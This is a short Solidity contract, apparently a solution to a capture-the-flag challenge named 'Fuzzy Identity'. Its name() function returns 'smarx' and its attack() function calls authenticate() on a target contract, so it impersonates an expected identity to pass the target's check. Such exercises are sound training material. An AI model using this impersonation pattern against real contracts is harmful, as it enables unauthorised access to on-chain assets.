pragma solidity ^0.7.4;


interface IFuzzyIdentityChallenge {
    function authenticate() external; 
}

contract FuzzyIdentityProxy {
    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }

    function attack(address _target) public {
        IFuzzyIdentityChallenge targetCont = IFuzzyIdentityChallenge(_target);
        targetCont.authenticate();
    }
}